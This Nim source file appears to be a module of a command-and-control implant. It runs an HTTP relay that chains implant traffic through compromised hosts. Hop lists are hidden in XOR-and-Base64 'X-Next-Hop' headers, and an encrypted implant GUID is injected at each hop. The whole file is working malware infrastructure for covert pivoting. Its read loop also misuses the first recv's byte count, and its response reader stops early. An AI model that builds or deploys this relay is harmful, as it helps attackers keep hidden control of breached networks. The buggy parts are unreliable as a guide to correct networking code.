#[
    Simple HTTP Relay - Pure HTTP Forwarding
    Relays HTTP requests transparently without decryption
    Only the C2 and final agent share encryption keys
]#

import net, nativesockets, strutils, times, base64
import ../util/crypto
import ../config/configParser

const
    RELAY_BUFFER_SIZE = 8192  # 8KB buffer for reading
    RELAY_TIMEOUT = 30000     # 30 seconds timeout
    MAX_HOP_COUNT = 10        # Maximum hops to prevent loops

type
    HttpRelayServer* = object
        socket*: Socket
        port*: int
        isListening*: bool
    
    HttpRequest = object
        `method`*: string
        path*: string
        headers*: seq[(string, string)]
        body*: string

# Parse X-Next-Hop header (encrypted with INITIAL_XOR_KEY)
# Returns the full hop chain as comma-separated string
proc decryptNextHop*(encrypted: string): string =
    try:
        # Base64 decode
        let decoded = base64.decode(encrypted)
        # XOR decrypt with INITIAL_XOR_KEY
        result = xorString(decoded, INITIAL_XOR_KEY)
        when defined debug:
            echo "[RELAY] 🔓 Decrypted X-Next-Hop chain: " & result
    except:
        when defined debug:
            echo "[RELAY] ❌ Failed to decrypt X-Next-Hop"
        result = ""

# Encrypt next hop chain for X-Next-Hop header (XOR + Base64)
proc encryptNextHop*(hopChain: string): string =
    let xored = xorString(hopChain, INITIAL_XOR_KEY)
    result = base64.encode(xored)
    when defined debug:
        echo "[RELAY] 🔐 Encrypted X-Next-Hop chain: " & hopChain & " -> " & result

# Pop first hop from comma-separated chain and return (nextHop, remainingChain)
# Returns empty if chain exceeds MAX_HOP_COUNT (loop protection)
proc popNextHop*(hopChain: string): (string, string) =
    let hops = hopChain.split(",")
    if hops.len == 0:
        return ("", "")
    
    # Loop protection: reject chains longer than MAX_HOP_COUNT
    if hops.len > MAX_HOP_COUNT:
        when defined debug:
            echo "[RELAY] ⚠️  Hop chain too long (" & $hops.len & " > " & $MAX_HOP_COUNT & "), possible loop"
        return ("", "")
    
    let nextHop = hops[0].strip()
    
    # Remaining hops (if any)
    var remaining = ""
    if hops.len > 1:
        for i in 1..<hops.len:
            if remaining != "":
                remaining.add(",")
            remaining.add(hops[i].strip())
    
    when defined debug:
        echo "[RELAY] 🔀 Pop hop: next=" & nextHop & ", remaining=" & (if remaining == "": "NONE (last hop)" else: remaining)
    
    return (nextHop, remaining)

# Parse HTTP request from raw data
proc parseHttpRequest(data: string): HttpRequest =
    var lines = data.split("\r\n")
    if lines.len == 0:
        return
    
    # Parse request line (e.g., "POST /task HTTP/1.1")
    let requestLine = lines[0].split(" ")
    if requestLine.len >= 2:
        result.`method` = requestLine[0]
        result.path = requestLine[1]
    
    # Parse headers
    var i = 1
    while i < lines.len and lines[i] != "":
        let headerLine = lines[i]
        let colonPos = headerLine.find(":")
        if colonPos > 0:
            let key = headerLine[0..<colonPos].strip()
            let value = headerLine[colonPos+1..^1].strip()
            result.headers.add((key, value))
        i.inc
    
    # Parse body (everything after blank line)
    i.inc  # Skip blank line
    if i < lines.len:
        result.body = lines[i..^1].join("\r\n")

# Encrypt relay GUID for X-Relay-GUID header (XOR + Base64)
proc encryptRelayGuid(guid: string): string =
    # XOR with INITIAL_XOR_KEY (same key used for INITIAL communication)
    let xored = xorString(guid, INITIAL_XOR_KEY)
    result = base64.encode(xored)
    when defined debug:
        echo "[RELAY] 🔐 Encrypted relay GUID: " & guid & " -> " & result

# Forward HTTP request to next hop with remaining hop chain
proc forwardRequest(nextHop: string, remainingHops: string, req: HttpRequest, relayGuid: string = ""): string =
    when defined debug:
        echo "[RELAY] 🔀 Forwarding to: " & nextHop
        echo "[RELAY] 🔀 Method: " & req.`method` & " Path: " & req.path
    
    try:
        # Parse next hop (format: "host:port")
        let parts = nextHop.split(":")
        if parts.len != 2:
            when defined debug:
                echo "[RELAY] ❌ Invalid next hop format: " & nextHop
            return ""
        
        let host = parts[0]
        let port = parseInt(parts[1])
        
        # Create socket and connect
        var client = newSocket()
        client.setSockOpt(OptReuseAddr, true)
        client.connect(host, Port(port))
        
        # Build HTTP request
        var request = req.`method` & " " & req.path & " HTTP/1.1\r\n"
        
        # Add original headers (skip X-Relay-GUID and X-Next-Hop - we'll handle these specially)
        for (key, value) in req.headers:
            let keyLower = key.toLower()
            if keyLower != "x-relay-guid" and keyLower != "x-next-hop":
                request.add(key & ": " & value & "\r\n")
            elif keyLower == "x-relay-guid":
                when defined debug:
                    echo "[RELAY] 🗑️ Removed existing X-Relay-GUID header (multi-hop cleanup)"
            elif keyLower == "x-next-hop":
                when defined debug:
                    echo "[RELAY] 🗑️ Removed existing X-Next-Hop header (will re-inject if more hops remain)"
        
        # Inject THIS relay's GUID (replacing any previous one)
        if relayGuid != "":
            let encryptedGuid = encryptRelayGuid(relayGuid)
            request.add("X-Relay-GUID: " & encryptedGuid & "\r\n")
            when defined debug:
                echo "[RELAY] 🏷️ Injected X-Relay-GUID: " & relayGuid
        
        # Re-inject X-Next-Hop with remaining hops (if any)
        if remainingHops != "":
            let encryptedRemainingHops = encryptNextHop(remainingHops)
            request.add("X-Next-Hop: " & encryptedRemainingHops & "\r\n")
            when defined debug:
                echo "[RELAY] 🔀 Re-injected X-Next-Hop with remaining chain: " & remainingHops
        else:
            when defined debug:
                echo "[RELAY] ✅ Last hop in chain - no X-Next-Hop header added"
        
        # Add blank line and body
        request.add("\r\n")
        if req.body != "":
            request.add(req.body)
        
        # Send request
        client.send(request)
        
        when defined debug:
            echo "[RELAY] 📤 Sent request to " & nextHop
        
        # Read response
        var response = ""
        var buffer = newString(RELAY_BUFFER_SIZE)
        while true:
            let bytesRead = client.recv(buffer, RELAY_BUFFER_SIZE)
            if bytesRead <= 0:
                break
            response.add(buffer[0..<bytesRead])
            
            # Check if we've received the complete response
            # (Simple heuristic: if we have Content-Length, check if we've read enough)
            if "Content-Length:" in response:
                # Parse content length and check if body is complete
                # This is simplified - production code would be more robust
                break
        
        client.close()
        
        when defined debug:
            echo "[RELAY] 📥 Received response (" & $response.len & " bytes)"
        
        return response
        
    except:
        when defined debug:
            echo "[RELAY] ❌ Forward failed: " & getCurrentExceptionMsg()
        return ""

# Handle incoming connection
proc handleRelayConnection(client: Socket, relayGuid: string = "") =
    when defined debug:
        echo "[RELAY] 🔌 New connection"
    
    try:
        # Configure socket for immediate data transmission (disable Nagle)
        client.setSockOpt(OptNoDelay, true)
        
        when defined debug:
            # Get peer info for debugging
            try:
                let (peerAddr, peerPort) = client.getPeerAddr()
                echo "[RELAY] 🔗 Connected from: " & peerAddr & ":" & $peerPort
            except:
                echo "[RELAY] ⚠️  Could not get peer address"
        
        # Read request with timeout
        var requestData = ""
        var buffer = newString(RELAY_BUFFER_SIZE)
        var expectedBodySize = 0
        var headersComplete = false
        
        when defined debug:
            echo "[RELAY] 📡 Waiting for request data... (15s timeout)"
        
        # Try to receive data with extended timeout
        let bytesRead = client.recv(buffer, RELAY_BUFFER_SIZE, timeout = 15000)
        
        when defined debug:
            echo "[RELAY] 📊 First recv result: bytesRead=" & $bytesRead
        
        if bytesRead <= 0:
            when defined debug:
                echo "[RELAY] ❌ No data received on first recv (timeout or closed)"
            client.close()
            return
        
        requestData.add(buffer[0..<bytesRead])
        when defined debug:
            echo "[RELAY] 📥 Received " & $bytesRead & " bytes"
            echo "[RELAY] 📄 First 100 chars: " & requestData[0..<(if requestData.len > 100: 100 else: requestData.len)]
        
        # Continue reading if needed
        while true:
            # Check if we've received complete headers
            if not headersComplete and "\r\n\r\n" in requestData:
                headersComplete = true
                when defined debug:
                    echo "[RELAY] ✅ Headers complete"
                
                # Check for body
                if "Content-Length:" in requestData:
                    let lines = requestData.split("\r\n")
                    for line in lines:
                        if line.toLower().startsWith("content-length:"):
                            let value = line.split(":")[1].strip()
                            expectedBodySize = parseInt(value)
                            when defined debug:
                                echo "[RELAY] 📦 Expected body size: " & $expectedBodySize & " bytes"
                            break
                else:
                    when defined debug:
                        echo "[RELAY] ✅ No Content-Length, request complete"
                    break
            
            # If we need more data, try to read
            if headersComplete and expectedBodySize > 0:
                let headerEnd = requestData.find("\r\n\r\n")
                let bodySize = requestData.len - headerEnd - 4
                when defined debug:
                    echo "[RELAY] 📦 Body progress: " & $bodySize & "/" & $expectedBodySize & " bytes"
                if bodySize >= expectedBodySize:
                    break
            
            # Try to read more data
            let moreBytes = client.recv(buffer, RELAY_BUFFER_SIZE, timeout = 5000)
            if moreBytes <= 0:
                when defined debug:
                    echo "[RELAY] 📭 Connection closed or no more data (bytesRead=" & $bytesRead & ")"
                # If we have headers, this is OK (GET requests have no body)
                if headersComplete:
                    when defined debug:
                        echo "[RELAY] ✅ Request complete (headers only, no body)"
                    break
                else:
                    when defined debug:
                        echo "[RELAY] ❌ Timeout before receiving complete headers"
                    client.close()
                    return
            
            requestData.add(buffer[0..<bytesRead])
            
            when defined debug:
                echo "[RELAY] 📥 Received " & $bytesRead & " bytes (total: " & $requestData.len & ")"
            
            # Check if we've received the complete headers
            if not headersComplete and "\r\n\r\n" in requestData:
                headersComplete = true
                when defined debug:
                    echo "[RELAY] ✅ Headers complete"
                
                # Check if there's a body by looking for Content-Length
                if "Content-Length:" in requestData:
                    let lines = requestData.split("\r\n")
                    for line in lines:
                        if line.toLower().startsWith("content-length:"):
                            let value = line.split(":")[1].strip()
                            expectedBodySize = parseInt(value)
                            when defined debug:
                                echo "[RELAY] 📦 Expected body size: " & $expectedBodySize & " bytes"
                            break
                else:
                    # No Content-Length header = no body (GET request)
                    when defined debug:
                        echo "[RELAY] ✅ No Content-Length, request complete"
                    break
            
            # If headers are complete and we have a body, check if we received it all
            if headersComplete and expectedBodySize > 0:
                let headerEnd = requestData.find("\r\n\r\n")
                let bodySize = requestData.len - headerEnd - 4
                when defined debug:
                    echo "[RELAY] 📦 Body progress: " & $bodySize & "/" & $expectedBodySize & " bytes"
                if bodySize >= expectedBodySize:
                    when defined debug:
                        echo "[RELAY] ✅ Complete body received"
                    break
        
        when defined debug:
            echo "[RELAY] 📦 Parsing HTTP request (" & $requestData.len & " bytes)"
        
        # Parse request
        let req = parseHttpRequest(requestData)
        
        when defined debug:
            echo "[RELAY] 📋 Request: " & req.`method` & " " & req.path
            echo "[RELAY] 📋 Headers count: " & $req.headers.len
        
        # Extract X-Next-Hop header (contains comma-separated hop chain)
        var hopChain = ""
        for (key, value) in req.headers:
            if key.toLower() == "x-next-hop":
                hopChain = decryptNextHop(value)
                when defined debug:
                    echo "[RELAY] 🔓 Found X-Next-Hop header, decrypted chain: " & hopChain
                break
        
        if hopChain == "":
            when defined debug:
                echo "[RELAY] ❌ No X-Next-Hop header found in request"
                echo "[RELAY] ❌ Available headers:"
                for (key, value) in req.headers:
                    echo "[RELAY]   - " & key & ": " & value
            let response = "HTTP/1.1 400 Bad Request\r\nContent-Length: 22\r\n\r\nMissing X-Next-Hop\r\n"
            client.send(response)
            client.close()
            return
        
        # Pop first hop from chain
        let (nextHop, remainingHops) = popNextHop(hopChain)
        
        if nextHop == "":
            when defined debug:
                echo "[RELAY] ❌ Empty hop chain after decryption"
            let response = "HTTP/1.1 400 Bad Request\r\nContent-Length: 0\r\n\r\n"
            client.send(response)
            client.close()
            return
        
        # Forward request with relay GUID and remaining hops
        let response = forwardRequest(nextHop, remainingHops, req, relayGuid)
        
        if response != "":
            client.send(response)
        else:
            let errorResponse = "HTTP/1.1 502 Bad Gateway\r\nContent-Length: 0\r\n\r\n"
            client.send(errorResponse)
        
        client.close()
        
    except:
        when defined debug:
            echo "[RELAY] ❌ Connection error: " & getCurrentExceptionMsg()
        try:
            client.close()
        except:
            discard

# Start HTTP relay server with implant GUID
# The relayGuid should be the actual implant GUID from the listener
proc startHttpRelayServer*(port: int, implantGuid: string = ""): HttpRelayServer =
    when defined debug:
        echo "[RELAY] 🚀 Starting HTTP relay server on port " & $port
    
    result.port = port
    result.isListening = false
    
    try:
        result.socket = newSocket()
        result.socket.setSockOpt(OptReuseAddr, true)
        result.socket.bindAddr(Port(port))
        result.socket.listen()
        result.isListening = true
        
        echo "[RELAY] ✅ HTTP relay server started on port " & $port
        
        # Use provided implant GUID or placeholder
        var relayGuid = implantGuid
        if relayGuid == "":
            when defined debug:
                echo "[RELAY] ⚠️ WARNING: No implant GUID provided, using placeholder"
            relayGuid = "RELAY-UNREGISTERED"
        
        when defined debug:
            echo "[RELAY] 🆔 Using implant GUID: " & relayGuid
        
        # Accept connections loop
        while true:
            var client: Socket
            new(client)
            result.socket.accept(client)
            
            # Handle in separate thread/async (for now, synchronous)
            handleRelayConnection(client, relayGuid)
            
    except:
        echo "[RELAY] ❌ Failed to start relay server: " & getCurrentExceptionMsg()
        result.isListening = false
